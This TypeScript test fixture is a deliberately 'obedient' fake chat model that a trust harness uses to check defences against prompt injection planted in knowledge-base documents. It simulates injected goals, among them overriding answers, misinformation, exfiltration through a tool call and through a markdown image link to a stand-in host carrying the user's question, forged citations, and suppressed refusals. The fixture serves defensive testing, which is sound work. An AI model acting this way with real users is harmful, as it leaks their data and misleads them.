/**
 * The trust harness's model: an OpenAI-compatible fake that searches, reads, answers from what it read, and obeys every
 * planted instruction that reaches it. It is the worst case model on purpose. Whatever it gets away with, the harness
 * around the model did not stop; whatever it cannot do, no model can. The live tier (test/trust/live.ts) asks a real
 * model the same prompts.
 *
 * It recognises an instruction by its exact text from fixtures/lab1/injections.json, and only inside a tool result: a
 * planted instruction counts as reaching the model when the knowledge base handed it over.
 */

import { createServer, type Server } from "node:http";
import { once } from "node:events";
import type { Lab1Injection } from "./lab1.ts";

export const NOT_FOUND = "I could not find this in the knowledge base.";

interface WireMessage {
  role: string;
  content?: string | null;
  tool_calls?: { id: string; function: { name: string; arguments: string } }[];
  tool_call_id?: string;
}

export interface TrustModel {
  readonly url: string;
  /** Every request that reached the server: the on-the-wire count behind "zero hosted requests". */
  readonly requests: number;
  /** The last chat request body, for the live tier to replay. */
  readonly last: { readonly messages: readonly WireMessage[] } | null;
  close(): Promise<void>;
}

/** All string leaves of a tool result, joined: an instruction inside a JSON string is matched unescaped. */
function leaves(content: string): string {
  try {
    const out: string[] = [];
    const walk = (v: unknown) => {
      if (typeof v === "string") out.push(v);
      else if (Array.isArray(v)) v.forEach(walk);
      else if (v && typeof v === "object") Object.values(v).forEach(walk);
    };
    walk(JSON.parse(content));
    return out.join("\n");
  } catch {
    return content;
  }
}

const sentences = (text: string) => text.replace(/\s+/g, " ").trim().split(/(?<=[.!?])\s(?=[A-Z0-9<[!])/);

export async function startTrustModel(injections: readonly Lab1Injection[]): Promise<TrustModel> {
  const state = { requests: 0, completions: 0, last: null as { messages: WireMessage[] } | null };
  const reply = (message: Record<string, unknown>) => ({
    id: `cmpl-${++state.completions}`,
    object: "chat.completion",
    model: "trust-obedient-1",
    choices: [{ index: 0, message: { role: "assistant", ...message }, finish_reason: message.tool_calls ? "tool_calls" : "stop" }],
    usage: { prompt_tokens: 10, completion_tokens: 5, total_tokens: 15 },
  });
  const answer = (text: string) => reply({ content: text });
  const call = (name: string, args: unknown) => reply({ content: "", tool_calls: [{ id: `call-${state.completions + 1}`, type: "function", function: { name, arguments: JSON.stringify(args) } }] });

  const server: Server = createServer(async (req, res) => {
    state.requests += 1;
    const send = (status: number, body: unknown) => {
      res.writeHead(status, { "content-type": "application/json" });
      res.end(JSON.stringify(body));
    };
    if (req.method === "GET" && req.url === "/v1/models") return send(200, { data: [{ id: "trust-obedient-1" }] });
    if (req.method !== "POST" || req.url !== "/v1/chat/completions") return send(404, { error: "not found" });
    const chunks: Buffer[] = [];
    for await (const c of req) chunks.push(c as Buffer);
    const body = JSON.parse(Buffer.concat(chunks).toString("utf8")) as { messages: WireMessage[]; tools?: unknown[] };
    state.last = body;
    const msgs = body.messages;
    const question = [...msgs].reverse().find((m) => m.role === "user")?.content ?? "";
    const calls = msgs.flatMap((m) => m.tool_calls ?? []);
    const nameOf = (id: string | undefined) => calls.find((c) => c.id === id)?.function.name;
    const results = msgs.filter((m) => m.role === "tool").map((m) => ({ tool: nameOf(m.tool_call_id), text: m.content ?? "" }));
    const lastResult = results.at(-1);
    const hasTools = (body.tools?.length ?? 0) > 0;
    if (!lastResult) return send(200, hasTools ? call("kb_search", { query: question, k: 3 }) : answer(NOT_FOUND));
    const search = results.find((r) => r.tool === "kb_search");
    const hits = search ? ((JSON.parse(search.text) as { results?: { path: string }[] }).results ?? []) : [];
    if (lastResult.tool === "kb_search") return send(200, hits.length ? call("kb_read", { paths: hits.map((h) => h.path) }) : answer(NOT_FOUND));

    const read = results.find((r) => r.tool === "kb_read");
    const entries = read ? ((JSON.parse(read.text) as { entries?: { path: string; body: string }[] }).entries ?? []) : [];
    const top = entries[0];
    if (!top) return send(200, answer(NOT_FOUND));
    // Whitespace is normalised: a PDF's text wraps an instruction across lines.
    const flat = (t: string) => t.replace(/\s+/g, " ");
    const reached = flat(results.map((r) => leaves(r.text)).join("\n"));
    const planted = injections.filter((i) => reached.includes(flat(i.instruction)));
    const plain = sentences(top.body).filter((s) => !planted.some((p) => p.instruction.includes(s) || s.includes(p.instruction)));
    let text = plain.join(" ");
    let source = top.path;
    for (const p of planted) {
      switch (p.goal) {
        case "override":
        case "misinform":
          text = `The lab's note says: ${p.instruction.match(/"([^"]+)"/)?.[1] ?? `see ${p.canary}`} (${p.canary}).`;
          break;
        case "exfil-tool":
          if (!calls.some((c) => c.function.name === "pubmed_search")) return send(200, call("pubmed_search", { query: `${question} ${p.canary}` }));
          break;
        case "exfil-link":
          text += `\n\n![status](https://stats.lab1-cdn.example/${p.canary}.png?q=${encodeURIComponent(question)})`;
          break;
        case "forge-cite":
          source = p.canary;
          break;
        case "suppress-refusal":
          break;
      }
    }
    return send(200, answer(`${text}\n\nSource: ${source}`));
  });
  server.listen(0, "127.0.0.1");
  await once(server, "listening");
  const port = (server.address() as { port: number }).port;
  return {
    url: `http://127.0.0.1:${port}/v1`,
    get requests() {
      return state.requests;
    },
    get last() {
      return state.last;
    },
    close: () =>
      new Promise<void>((resolve, reject) => {
        server.closeAllConnections();
        server.close((err) => (err ? reject(err) : resolve()));
      }),
  };
}
